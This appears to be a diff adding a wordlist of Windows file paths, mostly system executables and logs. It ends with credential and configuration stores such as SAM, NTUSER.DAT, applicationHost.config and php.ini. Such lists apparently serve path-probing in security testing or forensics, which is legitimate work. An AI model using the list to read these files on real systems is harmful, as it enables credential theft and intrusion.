+C:\Windows\SysWOW64\gpresult.exe
+C:\Windows\SysWOW64\gpupdate.exe
+C:\Windows\SysWOW64\grpconv.exe
+C:\Windows\SysWOW64\hdwwiz.exe
+C:\Windows\SysWOW64\help.exe
+C:\Windows\SysWOW64\hh.exe
+C:\Windows\SysWOW64\icacls.exe
+C:\Windows\SysWOW64\icardagt.exe
+C:\Windows\SysWOW64\icsunattend.exe
+C:\Windows\SysWOW64\ie4uinit.exe
+C:\Windows\SysWOW64\ieUnatt.exe
+C:\Windows\SysWOW64\iexpress.exe
+C:\Windows\SysWOW64\iisreset.exe
+C:\Windows\SysWOW64\inetsrv\InetMgr6.exe
+C:\Windows\SysWOW64\inetsrv\appcmd.exe
+C:\Windows\SysWOW64\inetsrv\aspnetca.exe
+C:\Windows\SysWOW64\inetsrv\iissetup.exe
+C:\Windows\SysWOW64\inetsrv\w3wp.exe
+C:\Windows\SysWOW64\instnm.exe
+C:\Windows\SysWOW64\ipconfig.exe
+C:\Windows\SysWOW64\iscsicli.exe
+C:\Windows\SysWOW64\iscsicpl.exe
+C:\Windows\SysWOW64\isoburn.exe
+C:\Windows\SysWOW64\java.exe
+C:\Windows\SysWOW64\javaw.exe
+C:\Windows\SysWOW64\ktmutil.exe
+C:\Windows\SysWOW64\label.exe
+C:\Windows\SysWOW64\lodctr.exe
+C:\Windows\SysWOW64\logagent.exe
+C:\Windows\SysWOW64\logman.exe
+C:\Windows\SysWOW64\makecab.exe
+C:\Windows\SysWOW64\mcbuilder.exe
+C:\Windows\SysWOW64\mfpmp.exe
+C:\Windows\SysWOW64\migwiz\MigSetup.exe
+C:\Windows\SysWOW64\migwiz\PostMig.exe
+C:\Windows\SysWOW64\migwiz\mighost.exe
+C:\Windows\SysWOW64\migwiz\migwiz.exe
+C:\Windows\SysWOW64\mmc.exe
+C:\Windows\SysWOW64\mobsync.exe
+C:\Windows\SysWOW64\mountvol.exe
+C:\Windows\SysWOW64\msdt.exe
+C:\Windows\SysWOW64\msfeedssync.exe
+C:\Windows\SysWOW64\mshta.exe
+C:\Windows\SysWOW64\msiexec.exe
+C:\Windows\SysWOW64\msinfo32.exe
+C:\Windows\SysWOW64\mspaint.exe
+C:\Windows\SysWOW64\msra.exe
+C:\Windows\SysWOW64\mstsc.exe
+C:\Windows\SysWOW64\mtstocom.exe
+C:\Windows\SysWOW64\ndadmin.exe
+C:\Windows\SysWOW64\net.exe
+C:\Windows\SysWOW64\net1.exe
+C:\Windows\SysWOW64\netbtugc.exe
+C:\Windows\SysWOW64\netiougc.exe
+C:\Windows\SysWOW64\netsh.exe
+C:\Windows\SysWOW64\newdev.exe
+C:\Windows\SysWOW64\notepad.exe
+C:\Windows\SysWOW64\nslookup.exe
+C:\Windows\SysWOW64\ntkrnlpa.exe
+C:\Windows\SysWOW64\ntoskrnl.exe
+C:\Windows\SysWOW64\ntprint.exe
+C:\Windows\SysWOW64\ocsetup.exe
+C:\Windows\SysWOW64\odbcad32.exe
+C:\Windows\SysWOW64\odbcconf.exe
+C:\Windows\SysWOW64\openfiles.exe
+C:\Windows\SysWOW64\osk.exe
+C:\Windows\SysWOW64\pcaui.exe
+C:\Windows\SysWOW64\perfhost.exe
+C:\Windows\SysWOW64\perfmon.exe
+C:\Windows\SysWOW64\poqexec.exe
+C:\Windows\SysWOW64\powercfg.exe
+C:\Windows\SysWOW64\prevhost.exe
+C:\Windows\SysWOW64\print.exe
+C:\Windows\SysWOW64\printui.exe
+C:\Windows\SysWOW64\proquota.exe
+C:\Windows\SysWOW64\psr.exe
+C:\Windows\SysWOW64\rasautou.exe
+C:\Windows\SysWOW64\rasdial.exe
+C:\Windows\SysWOW64\raserver.exe
+C:\Windows\SysWOW64\rasphone.exe
+C:\Windows\SysWOW64\rdrleakdiag.exe
+C:\Windows\SysWOW64\recover.exe
+C:\Windows\SysWOW64\reg.exe
+C:\Windows\SysWOW64\regedit.exe
+C:\Windows\SysWOW64\regedt32.exe
+C:\Windows\SysWOW64\regsvr32.exe
+C:\Windows\SysWOW64\rekeywiz.exe
+C:\Windows\SysWOW64\relog.exe
+C:\Windows\SysWOW64\replace.exe
+C:\Windows\SysWOW64\resmon.exe
+C:\Windows\SysWOW64\rrinstaller.exe
+C:\Windows\SysWOW64\runas.exe
+C:\Windows\SysWOW64\rundll32.exe
+C:\Windows\SysWOW64\runonce.exe
+C:\Windows\SysWOW64\sc.exe
+C:\Windows\SysWOW64\schtasks.exe
+C:\Windows\SysWOW64\sdbinst.exe
+C:\Windows\SysWOW64\sdchange.exe
+C:\Windows\SysWOW64\sdiagnhost.exe
+C:\Windows\SysWOW64\secinit.exe
+C:\Windows\SysWOW64\sethc.exe
+C:\Windows\SysWOW64\setup16.exe
+C:\Windows\SysWOW64\setupSNK.exe
+C:\Windows\SysWOW64\setupugc.exe
+C:\Windows\SysWOW64\setx.exe
+C:\Windows\SysWOW64\sfc.exe
+C:\Windows\SysWOW64\shrpubw.exe
+C:\Windows\SysWOW64\shutdown.exe
+C:\Windows\SysWOW64\sort.exe
+C:\Windows\SysWOW64\srdelayed.exe
+C:\Windows\SysWOW64\subst.exe
+C:\Windows\SysWOW64\svchost.exe
+C:\Windows\SysWOW64\sxstrace.exe
+C:\Windows\SysWOW64\syskey.exe
+C:\Windows\SysWOW64\systeminfo.exe
+C:\Windows\SysWOW64\systray.exe
+C:\Windows\SysWOW64\takeown.exe
+C:\Windows\SysWOW64\taskeng.exe
+C:\Windows\SysWOW64\taskkill.exe
+C:\Windows\SysWOW64\tasklist.exe
+C:\Windows\SysWOW64\taskmgr.exe
+C:\Windows\SysWOW64\tcmsetup.exe
+C:\Windows\SysWOW64\timeout.exe
+C:\Windows\SysWOW64\tracerpt.exe
+C:\Windows\SysWOW64\typeperf.exe
+C:\Windows\SysWOW64\tzutil.exe
+C:\Windows\SysWOW64\unlodctr.exe
+C:\Windows\SysWOW64\unregmp2.exe
+C:\Windows\SysWOW64\upnpcont.exe
+C:\Windows\SysWOW64\user.exe
+C:\Windows\SysWOW64\userinit.exe
+C:\Windows\SysWOW64\verclsid.exe
+C:\Windows\SysWOW64\verifier.exe
+C:\Windows\SysWOW64\vsjitdebugger.exe
+C:\Windows\SysWOW64\vssadmin.exe
+C:\Windows\SysWOW64\w32tm.exe
+C:\Windows\SysWOW64\waitfor.exe
+C:\Windows\SysWOW64\wbem\WMIADAP.exe
+C:\Windows\SysWOW64\wbem\WMIC.exe
+C:\Windows\SysWOW64\wbem\WinMgmt.exe
+C:\Windows\SysWOW64\wbem\WmiPrvSE.exe
+C:\Windows\SysWOW64\wbem\mofcomp.exe
+C:\Windows\SysWOW64\wecutil.exe
+C:\Windows\SysWOW64\wermgr.exe
+C:\Windows\SysWOW64\wevtutil.exe
+C:\Windows\SysWOW64\wextract.exe
+C:\Windows\SysWOW64\where.exe
+C:\Windows\SysWOW64\whoami.exe
+C:\Windows\SysWOW64\wiaacmgr.exe
+C:\Windows\SysWOW64\wimserv.exe
+C:\Windows\SysWOW64\wininit.exe
+C:\Windows\SysWOW64\winrs.exe
+C:\Windows\SysWOW64\winrshost.exe
+C:\Windows\SysWOW64\winver.exe
+C:\Windows\SysWOW64\wlanext.exe
+C:\Windows\SysWOW64\wowreg32.exe
+C:\Windows\SysWOW64\write.exe
+C:\Windows\SysWOW64\wscript.exe
+C:\Windows\SysWOW64\wsmprovhost.exe
+C:\Windows\SysWOW64\wuapp.exe
+C:\Windows\SysWOW64\wusa.exe
+C:\Windows\SysWOW64\xcopy.exe
+C:\Windows\SysWOW64\xpsrchvw.exe
+C:\Windows\SysWOW64\xwizard.exe
+C:\Windows\System32\ARP.EXE
+C:\Windows\System32\ATIODCLI.exe
+C:\Windows\System32\ATIODE.exe
+C:\Windows\System32\AdapterTroubleshooter.exe
+C:\Windows\System32\AtBroker.exe
+C:\Windows\System32\AxInstUI.exe
+C:\Windows\System32\BdeUISrv.exe
+C:\Windows\System32\BdeUnlockWizard.exe
+C:\Windows\System32\Boot\winload.exe
+C:\Windows\System32\Boot\winresume.exe
+C:\Windows\System32\CIDAEMON.EXE
+C:\Windows\System32\CISVC.EXE
+C:\Windows\System32\CertEnrollCtrl.exe
+C:\Windows\System32\CompMgmtLauncher.exe
+C:\Windows\System32\ComputerDefaults.exe
+C:\Windows\System32\DFDWiz.exe
+C:\Windows\System32\DWWIN.EXE
+C:\Windows\System32\Defrag.exe
+C:\Windows\System32\DeviceDisplayObjectProvider.exe
+C:\Windows\System32\DeviceEject.exe
+C:\Windows\System32\DevicePairingWizard.exe
+C:\Windows\System32\DeviceProperties.exe
+C:\Windows\System32\Dism.exe
+C:\Windows\System32\Dism\DismHost.exe
+C:\Windows\System32\DisplaySwitch.exe
+C:\Windows\System32\DpiScaling.exe
+C:\Windows\System32\Dxpserver.exe
+C:\Windows\System32\Eap3Host.exe
+C:\Windows\System32\EhStorAuthn.exe
+C:\Windows\System32\GettingStarted.exe
+C:\Windows\System32\GroupPolicy
+C:\Windows\System32\GroupPolicyUsers
+C:\Windows\System32\HOSTNAME.EXE
+C:\Windows\System32\IME\IMEJP10\IMJPDADM.EXE
+C:\Windows\System32\IME\IMEJP10\IMJPDCT.EXE
+C:\Windows\System32\IME\IMEJP10\IMJPDSVR.EXE
+C:\Windows\System32\IME\IMEJP10\IMJPMGR.EXE
+C:\Windows\System32\IME\IMEJP10\IMJPUEX.EXE
+C:\Windows\System32\IME\IMEJP10\imjppdmg.exe
+C:\Windows\System32\IME\IMEJP10\imjpuexc.exe
+C:\Windows\System32\IME\IMESC5\IMSCPROP.exe
+C:\Windows\System32\IME\IMETC10\IMTCPROP.exe
+C:\Windows\System32\IME\shared\IMCCPHR.exe
+C:\Windows\System32\IME\shared\IMEPADSV.EXE
+C:\Windows\System32\InfDefaultInstall.exe
+C:\Windows\System32\LocationNotifications.exe
+C:\Windows\System32\Locator.exe
+C:\Windows\System32\LogFiles\Firewall\pfirewall.log
+C:\Windows\System32\LogFiles\W32Time\w32time.log
+C:\Windows\System32\LogFiles\W3SVC1
+C:\Windows\System32\LogonUI.exe
+C:\Windows\System32\MRINFO.EXE
+C:\Windows\System32\MRT.exe
+C:\Windows\System32\Macromed\Flash\FlashUtil64_11_4_402_287_ActiveX.exe
+C:\Windows\System32\Magnify.exe
+C:\Windows\System32\MdRes.exe
+C:\Windows\System32\MdSched.exe
+C:\Windows\System32\MigAutoPlay.exe
+C:\Windows\System32\MpSigStub.exe
+C:\Windows\System32\MuiUnattend.exe
+C:\Windows\System32\MultiDigiMon.exe
+C:\Windows\System32\NAPSTAT.EXE
+C:\Windows\System32\NETSTAT.EXE
+C:\Windows\System32\Narrator.exe
+C:\Windows\System32\Netplwiz.exe
+C:\Windows\System32\OpenSSH\Logs
+C:\Windows\System32\OptionalFeatures.exe
+C:\Windows\System32\OxpsConverter.exe
+C:\Windows\System32\PATHPING.EXE
+C:\Windows\System32\PING.EXE
+C:\Windows\System32\PkgMgr.exe
+C:\Windows\System32\PnPUnattend.exe
+C:\Windows\System32\PnPutil.exe
+C:\Windows\System32\PresentationHost.exe
+C:\Windows\System32\PrintIsolationHost.exe
+C:\Windows\System32\RMActivate.exe
+C:\Windows\System32\RMActivate_isv.exe
+C:\Windows\System32\RMActivate_ssp.exe
+C:\Windows\System32\RMActivate_ssp_isv.exe
+C:\Windows\System32\ROUTE.EXE
+C:\Windows\System32\ReAgentc.exe
+C:\Windows\System32\RegisterIEPKEYs.exe
+C:\Windows\System32\RelPost.exe
+C:\Windows\System32\RmClient.exe
+C:\Windows\System32\Robocopy.exe
+C:\Windows\System32\RpcPing.exe
+C:\Windows\System32\RunLegacyCPLElevated.exe
+C:\Windows\System32\SearchFilterHost.exe
+C:\Windows\System32\SearchIndexer.exe
+C:\Windows\System32\SearchProtocolHost.exe
+C:\Windows\System32\SecEdit.exe
+C:\Windows\System32\SetIEInstalledDate.exe
+C:\Windows\System32\SndVol.exe
+C:\Windows\System32\SnippingTool.exe
+C:\Windows\System32\SoundRecorder.exe
+C:\Windows\System32\Speech\SpeechUX\SpeechUXTutorial.exe
+C:\Windows\System32\Speech\SpeechUX\SpeechUXWiz.exe
+C:\Windows\System32\StikyNot.exe
+C:\Windows\System32\SyncHost.exe
+C:\Windows\System32\SystemPropertiesAdvanced.exe
+C:\Windows\System32\SystemPropertiesComputerName.exe
+C:\Windows\System32\SystemPropertiesDataExecutionPrevention.exe
+C:\Windows\System32\SystemPropertiesHardware.exe
+C:\Windows\System32\SystemPropertiesPerformance.exe
+C:\Windows\System32\SystemPropertiesProtection.exe
+C:\Windows\System32\SystemPropertiesRemote.exe
+C:\Windows\System32\TCPSVCS.EXE
+C:\Windows\System32\TFTP.EXE
+C:\Windows\System32\TRACERT.EXE
+C:\Windows\System32\TSTheme.exe
+C:\Windows\System32\TSWbPrxy.exe
+C:\Windows\System32\TapiUnattend.exe
+C:\Windows\System32\TpmInit.exe
+C:\Windows\System32\TsUsbRedirectionGroupPolicyControl.exe
+C:\Windows\System32\TsWpfWrp.exe
+C:\Windows\System32\UI0Detect.exe
+C:\Windows\System32\UserAccountControlSettings.exe
+C:\Windows\System32\Utilman.exe
+C:\Windows\System32\VSSVC.exe
+C:\Windows\System32\VaultCmd.exe
+C:\Windows\System32\VaultSysUi.exe
+C:\Windows\System32\WPDShextAutoplay.exe
+C:\Windows\System32\WSManHTTPConfig.exe
+C:\Windows\System32\WUDFHost.exe
+C:\Windows\System32\Wat\WatAdminSvc.exe
+C:\Windows\System32\Wat\WatUX.exe
+C:\Windows\System32\WerFault.exe
+C:\Windows\System32\WerFaultSecure.exe
+C:\Windows\System32\WinSAT.exe
+C:\Windows\System32\WindowsAnytimeUpgrade.exe
+C:\Windows\System32\WindowsAnytimeUpgradeResults.exe
+C:\Windows\System32\WindowsAnytimeUpgradeui.exe
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell_ise.exe
+C:\Windows\System32\Winevt\Logs\AppEvent.evt
+C:\Windows\System32\Winevt\Logs\Shutdown.evtx
+C:\Windows\System32\aitagent.exe
+C:\Windows\System32\alg.exe
+C:\Windows\System32\appidcertstorecheck.exe
+C:\Windows\System32\appidpolicyconverter.exe
+C:\Windows\System32\appverif.exe
+C:\Windows\System32\at.exe
+C:\Windows\System32\atiapfxx.exe
+C:\Windows\System32\atibtmon.exe
+C:\Windows\System32\atieclxx.exe
+C:\Windows\System32\atiesrxx.exe
+C:\Windows\System32\attrib.exe
+C:\Windows\System32\audiodg.exe
+C:\Windows\System32\auditpol.exe
+C:\Windows\System32\autochk.exe
+C:\Windows\System32\autoconv.exe
+C:\Windows\System32\autofmt.exe
+C:\Windows\System32\bcdboot.exe
+C:\Windows\System32\bcdedit.exe
+C:\Windows\System32\bitsadmin.exe
+C:\Windows\System32\bootcfg.exe
+C:\Windows\System32\bridgeunattend.exe
+C:\Windows\System32\bthudtask.exe
+C:\Windows\System32\cacls.exe
+C:\Windows\System32\calc.exe
+C:\Windows\System32\certreq.exe
+C:\Windows\System32\certutil.exe
+C:\Windows\System32\charmap.exe
+C:\Windows\System32\chkdsk.exe
+C:\Windows\System32\chkntfs.exe
+C:\Windows\System32\choice.exe
+C:\Windows\System32\cipher.exe
+C:\Windows\System32\cleanmgr.exe
+C:\Windows\System32\cliconfg.exe
+C:\Windows\System32\clinfo.exe
+C:\Windows\System32\clip.exe
+C:\Windows\System32\cmd.exe
+C:\Windows\System32\cmdkey.exe
+C:\Windows\System32\cmdl32.exe
+C:\Windows\System32\cmmon32.exe
+C:\Windows\System32\cmstp.exe
+C:\Windows\System32\cofire.exe
+C:\Windows\System32\colorcpl.exe
+C:\Windows\System32\com\MigRegDB.exe
+C:\Windows\System32\com\comrepl.exe
+C:\Windows\System32\comp.exe
+C:\Windows\System32\compact.exe
+C:\Windows\System32\config
+C:\Windows\System32\conhost.exe
+C:\Windows\System32\consent.exe
+C:\Windows\System32\control.exe
+C:\Windows\System32\convert.exe
+C:\Windows\System32\credwiz.exe
+C:\Windows\System32\cscript.exe
+C:\Windows\System32\csrss.exe
+C:\Windows\System32\ctfmon.exe
+C:\Windows\System32\cttune.exe
+C:\Windows\System32\cttunesvr.exe
+C:\Windows\System32\dccw.exe
+C:\Windows\System32\dcomcnfg.exe
+C:\Windows\System32\ddodiag.exe
+C:\Windows\System32\dfrgui.exe
+C:\Windows\System32\dialer.exe
+C:\Windows\System32\diantz.exe
+C:\Windows\System32\dinotify.exe
+C:\Windows\System32\diskpart.exe
+C:\Windows\System32\diskperf.exe
+C:\Windows\System32\diskraid.exe
+C:\Windows\System32\dispdiag.exe
+C:\Windows\System32\djoin.exe
+C:\Windows\System32\dllhost.exe
+C:\Windows\System32\dllhst3g.exe
+C:\Windows\System32\dnscacheugc.exe
+C:\Windows\System32\doskey.exe
+C:\Windows\System32\dpapimig.exe
+C:\Windows\System32\dpnsvr.exe
+C:\Windows\System32\driverquery.exe
+C:\Windows\System32\drivers\etc\hosts
+C:\Windows\System32\drvinst.exe
+C:\Windows\System32\dvdplay.exe
+C:\Windows\System32\dvdupgrd.exe
+C:\Windows\System32\dwm.exe
+C:\Windows\System32\dxcpl.exe
+C:\Windows\System32\dxdiag.exe
+C:\Windows\System32\efsui.exe
+C:\Windows\System32\esentutl.exe
+C:\Windows\System32\eudcedit.exe
+C:\Windows\System32\eventcreate.exe
+C:\Windows\System32\eventvwr.exe
+C:\Windows\System32\expand.exe
+C:\Windows\System32\extrac32.exe
+C:\Windows\System32\fc.exe
+C:\Windows\System32\find.exe
+C:\Windows\System32\findstr.exe
+C:\Windows\System32\finger.exe
+C:\Windows\System32\fixmapi.exe
+C:\Windows\System32\fltMC.exe
+C:\Windows\System32\fontview.exe
+C:\Windows\System32\forfiles.exe
+C:\Windows\System32\fsutil.exe
+C:\Windows\System32\ftp.exe
+C:\Windows\System32\fvenotify.exe
+C:\Windows\System32\fveprompt.exe
+C:\Windows\System32\getmac.exe
+C:\Windows\System32\gpresult.exe
+C:\Windows\System32\gpupdate.exe
+C:\Windows\System32\grpconv.exe
+C:\Windows\System32\hdwwiz.exe
+C:\Windows\System32\help.exe
+C:\Windows\System32\icacls.exe
+C:\Windows\System32\icardagt.exe
+C:\Windows\System32\icsunattend.exe
+C:\Windows\System32\ie4uinit.exe
+C:\Windows\System32\ieUnatt.exe
+C:\Windows\System32\iexpress.exe
+C:\Windows\System32\iisreset.exe
+C:\Windows\System32\inetsrv\InetMgr.exe
+C:\Windows\System32\inetsrv\InetMgr6.exe
+C:\Windows\System32\inetsrv\WMSvc.exe
+C:\Windows\System32\inetsrv\appcmd.exe
+C:\Windows\System32\inetsrv\aspnetca.exe
+C:\Windows\System32\inetsrv\config\administration.config
+C:\Windows\System32\inetsrv\config\applicationHost.config
+C:\Windows\System32\inetsrv\config\applicationHost.hist
+C:\Windows\System32\inetsrv\config\monitoring\global.xml
+C:\Windows\System32\inetsrv\config\redirection.config
+C:\Windows\System32\inetsrv\config\schema\ASPNET_schema.xml
+C:\Windows\System32\inetsrv\config\schema\IISProvider_schema.xml
+C:\Windows\System32\inetsrv\config\schema\IIS_schema.xml
+C:\Windows\System32\inetsrv\config\schema\applicationHost.xsd
+C:\Windows\System32\inetsrv\config\schema\dotnetconfig.xsd
+C:\Windows\System32\inetsrv\config\schema\rewrite_schema.xml
+C:\Windows\System32\inetsrv\iisrstas.exe
+C:\Windows\System32\inetsrv\iissetup.exe
+C:\Windows\System32\inetsrv\inetinfo.exe
+C:\Windows\System32\inetsrv\w3wp.exe
+C:\Windows\System32\ipconfig.exe
+C:\Windows\System32\irftp.exe
+C:\Windows\System32\iscsicli.exe
+C:\Windows\System32\iscsicpl.exe
+C:\Windows\System32\isintsup.exe
+C:\Windows\System32\isoburn.exe
+C:\Windows\System32\klist.exe
+C:\Windows\System32\ksetup.exe
+C:\Windows\System32\ktmutil.exe
+C:\Windows\System32\label.exe
+C:\Windows\System32\lodctr.exe
+C:\Windows\System32\logagent.exe
+C:\Windows\System32\logman.exe
+C:\Windows\System32\lpksetup.exe
+C:\Windows\System32\lpremove.exe
+C:\Windows\System32\lsass.exe
+C:\Windows\System32\lsm.exe
+C:\Windows\System32\makecab.exe
+C:\Windows\System32\manage-bde.exe
+C:\Windows\System32\mblctr.exe
+C:\Windows\System32\mcbuilder.exe
+C:\Windows\System32\mctadmin.exe
+C:\Windows\System32\mfpmp.exe
+C:\Windows\System32\microsoft.windows.softwarelogo.showdesktop.exe
+C:\Windows\System32\migwiz\MigSetup.exe
+C:\Windows\System32\migwiz\PostMig.exe
+C:\Windows\System32\migwiz\mighost.exe
+C:\Windows\System32\migwiz\migwiz.exe
+C:\Windows\System32\mmc.exe
+C:\Windows\System32\mobsync.exe
+C:\Windows\System32\mountvol.exe
+C:\Windows\System32\mpnotify.exe
+C:\Windows\System32\msconfig.exe
+C:\Windows\System32\msdt.exe
+C:\Windows\System32\msdtc.exe
+C:\Windows\System32\msfeedssync.exe
+C:\Windows\System32\mshta.exe
+C:\Windows\System32\msiexec.exe
+C:\Windows\System32\msinfo32.exe
+C:\Windows\System32\mspaint.exe
+C:\Windows\System32\msra.exe
+C:\Windows\System32\mstsc.exe
+C:\Windows\System32\mtstocom.exe
+C:\Windows\System32\nbtstat.exe
+C:\Windows\System32\ndadmin.exe
+C:\Windows\System32\net.exe
+C:\Windows\System32\net1.exe
+C:\Windows\System32\netbtugc.exe
+C:\Windows\System32\netcfg.exe
+C:\Windows\System32\netiougc.exe
+C:\Windows\System32\netsh.exe
+C:\Windows\System32\newdev.exe
+C:\Windows\System32\nltest.exe
+C:\Windows\System32\notepad.exe
+C:\Windows\System32\nslookup.exe
+C:\Windows\System32\ntoskrnl.exe
+C:\Windows\System32\ntprint.exe
+C:\Windows\System32\ocsetup.exe
+C:\Windows\System32\odbcad32.exe
+C:\Windows\System32\odbcconf.exe
+C:\Windows\System32\oobe\Setup.exe
+C:\Windows\System32\oobe\audit.exe
+C:\Windows\System32\oobe\msoobe.exe
+C:\Windows\System32\oobe\oobeldr.exe
+C:\Windows\System32\oobe\setupsqm.exe
+C:\Windows\System32\oobe\windeploy.exe
+C:\Windows\System32\openfiles.exe
+C:\Windows\System32\osk.exe
+C:\Windows\System32\p2phost.exe
+C:\Windows\System32\pcalua.exe
+C:\Windows\System32\pcaui.exe
+C:\Windows\System32\pcawrk.exe
+C:\Windows\System32\pcwrun.exe
+C:\Windows\System32\perfmon.exe
+C:\Windows\System32\plasrv.exe
+C:\Windows\System32\poqexec.exe
+C:\Windows\System32\powercfg.exe
+C:\Windows\System32\prevhost.exe
+C:\Windows\System32\print.exe
+C:\Windows\System32\printfilterpipelinesvc.exe
+C:\Windows\System32\printui.exe
+C:\Windows\System32\proquota.exe
+C:\Windows\System32\psr.exe
+C:\Windows\System32\rasautou.exe
+C:\Windows\System32\rasdial.exe
+C:\Windows\System32\raserver.exe
+C:\Windows\System32\rasphone.exe
+C:\Windows\System32\rdrleakdiag.exe
+C:\Windows\System32\rdrmemptylst.exe
+C:\Windows\System32\recdisc.exe
+C:\Windows\System32\recover.exe
+C:\Windows\System32\reg.exe
+C:\Windows\System32\regedt32.exe
+C:\Windows\System32\regsvr32.exe
+C:\Windows\System32\rekeywiz.exe
+C:\Windows\System32\relog.exe
+C:\Windows\System32\repair-bde.exe
+C:\Windows\System32\replace.exe
+C:\Windows\System32\resmon.exe
+C:\Windows\System32\rrinstaller.exe
+C:\Windows\System32\rstrui.exe
+C:\Windows\System32\runas.exe
+C:\Windows\System32\rundll32.exe
+C:\Windows\System32\runonce.exe
+C:\Windows\System32\sc.exe
+C:\Windows\System32\schtasks.exe
+C:\Windows\System32\sdbinst.exe
+C:\Windows\System32\sdchange.exe
+C:\Windows\System32\sdclt.exe
+C:\Windows\System32\sdiagnhost.exe
+C:\Windows\System32\secinit.exe
+C:\Windows\System32\services.exe
+C:\Windows\System32\sethc.exe
+C:\Windows\System32\setspn.exe
+C:\Windows\System32\setupcl.exe
+C:\Windows\System32\setupugc.exe
+C:\Windows\System32\setx.exe
+C:\Windows\System32\sfc.exe
+C:\Windows\System32\shrpubw.exe
+C:\Windows\System32\shutdown.exe
+C:\Windows\System32\sigverif.exe
+C:\Windows\System32\slui.exe
+C:\Windows\System32\smss.exe
+C:\Windows\System32\snmptrap.exe
+C:\Windows\System32\sort.exe
+C:\Windows\System32\spinstall.exe
+C:\Windows\System32\spoolsv.exe
+C:\Windows\System32\sppsvc.exe
+C:\Windows\System32\spreview.exe
+C:\Windows\System32\srdelayed.exe
+C:\Windows\System32\subst.exe
+C:\Windows\System32\svchost.exe
+C:\Windows\System32\sxstrace.exe
+C:\Windows\System32\syskey.exe
+C:\Windows\System32\sysprep\sysprep.exe
+C:\Windows\System32\systeminfo.exe
+C:\Windows\System32\systray.exe
+C:\Windows\System32\tabcal.exe
+C:\Windows\System32\takeown.exe
+C:\Windows\System32\taskeng.exe
+C:\Windows\System32\taskhost.exe
+C:\Windows\System32\taskkill.exe
+C:\Windows\System32\tasklist.exe
+C:\Windows\System32\taskmgr.exe
+C:\Windows\System32\tcmsetup.exe
+C:\Windows\System32\telnet.exe
+C:\Windows\System32\timeout.exe
+C:\Windows\System32\tracerpt.exe
+C:\Windows\System32\typeperf.exe
+C:\Windows\System32\tzutil.exe
+C:\Windows\System32\ucsvc.exe
+C:\Windows\System32\unlodctr.exe
+C:\Windows\System32\unregmp2.exe
+C:\Windows\System32\upnpcont.exe
+C:\Windows\System32\userinit.exe
+C:\Windows\System32\vds.exe
+C:\Windows\System32\vdsldr.exe
+C:\Windows\System32\verclsid.exe
+C:\Windows\System32\verifier.exe
+C:\Windows\System32\vsjitdebugger.exe
+C:\Windows\System32\vssadmin.exe
+C:\Windows\System32\w32tm.exe
+C:\Windows\System32\waitfor.exe
+C:\Windows\System32\wbadmin.exe
+C:\Windows\System32\wbem\WMIADAP.exe
+C:\Windows\System32\wbem\WMIC.exe
+C:\Windows\System32\wbem\WinMgmt.exe
+C:\Windows\System32\wbem\WmiApSrv.exe
+C:\Windows\System32\wbem\WmiPrvSE.exe
+C:\Windows\System32\wbem\mofcomp.exe
+C:\Windows\System32\wbem\scrcons.exe
+C:\Windows\System32\wbem\unsecapp.exe
+C:\Windows\System32\wbem\wbemtest.exe
+C:\Windows\System32\wbengine.exe
+C:\Windows\System32\wecutil.exe
+C:\Windows\System32\wermgr.exe
+C:\Windows\System32\wevtutil.exe
+C:\Windows\System32\wextract.exe
+C:\Windows\System32\where.exe
+C:\Windows\System32\whoami.exe
+C:\Windows\System32\wiaacmgr.exe
+C:\Windows\System32\wiawow64.exe
+C:\Windows\System32\wimserv.exe
+C:\Windows\System32\winevt\Logs
+C:\Windows\System32\winevt\Logs\Application.evtx
+C:\Windows\System32\winevt\Logs\Security.evtx
+C:\Windows\System32\winevt\Logs\System.evtx
+C:\Windows\System32\wininit.exe
+C:\Windows\System32\winload.exe
+C:\Windows\System32\winlogon.exe
+C:\Windows\System32\winresume.exe
+C:\Windows\System32\winrs.exe
+C:\Windows\System32\winrshost.exe
+C:\Windows\System32\winver.exe
+C:\Windows\System32\wisptis.exe
+C:\Windows\System32\wksprt.exe
+C:\Windows\System32\wlanext.exe
+C:\Windows\System32\wlrmdr.exe
+C:\Windows\System32\wowreg32.exe
+C:\Windows\System32\wpnpinst.exe
+C:\Windows\System32\write.exe
+C:\Windows\System32\wscript.exe
+C:\Windows\System32\wsmprovhost.exe
+C:\Windows\System32\wsqmcons.exe
+C:\Windows\System32\wuapp.exe
+C:\Windows\System32\wuauclt.exe
+C:\Windows\System32\wusa.exe
+C:\Windows\System32\xcopy.exe
+C:\Windows\System32\xpsrchvw.exe
+C:\Windows\System32\xwizard.exe
+C:\Windows\Temp\setupact.log
+C:\Windows\Temp\setuperr.log
+C:\Windows\WindowsUpdate.log
+C:\Windows\bfsvc.exe
+C:\Windows\debug\NetSetup.log
+C:\Windows\debug\NetSetupSvc.log
+C:\Windows\debug\UserMode\ChkAcc.log
+C:\Windows\debug\UserMode\ChkUpd.log
+C:\Windows\debug\UserMode\Enum.log
+C:\Windows\debug\UserMode\FntCach2.log
+C:\Windows\debug\UserMode\FntCache.log
+C:\Windows\debug\UserMode\IECompatCache.log
+C:\Windows\debug\UserMode\IECompatUACCache.log
+C:\Windows\debug\UserMode\IeInst.log
+C:\Windows\debug\UserMode\MUI.log
+C:\Windows\debug\UserMode\MdmDiagnostics.log
+C:\Windows\debug\UserMode\SETUPAPI.log
+C:\Windows\debug\UserMode\SMINST\BL2.log
+C:\Windows\debug\UserMode\SMINST\SMSTS.LOG
+C:\Windows\debug\UserMode\SndVolSSO.log
+C:\Windows\debug\UserMode\UA-Client-Transport.log
+C:\Windows\debug\UserMode\Uninstall\DX[month].LOG
+C:\Windows\debug\UserMode\Uninstall\IE[month].log
+C:\Windows\debug\UserMode\Uninstall\uninstall.log
+C:\Windows\debug\UserMode\WIA\wiatrace.log
+C:\Windows\debug\UserMode\gptext.log
+C:\Windows\debug\UserMode\logagent.log
+C:\Windows\debug\UserMode\pdmlog.log
+C:\Windows\debug\UserMode\setuperr.log
+C:\Windows\debug\UserMode\userenv.log
+C:\Windows\debug\UserMode\userenv.log2
+C:\Windows\debug\UserMode\usermode.log
+C:\Windows\debug\UserMode\wdc.log
+C:\Windows\explorer.exe
+C:\Windows\fveupdate.exe
+C:\Windows\hh.exe
+C:\Windows\inetpub\logs\LogFiles
+C:\Windows\notepad.exe
+C:\Windows\php.ini
+C:\Windows\regedit.exe
+C:\Windows\servicing\GC64\tzupd.exe
+C:\Windows\servicing\TrustedInstaller.exe
+C:\Windows\splwow64.exe
+C:\Windows\system.ini
+C:\Windows\system32\config\NTUSER.DAT
+C:\Windows\system32\config\SAM
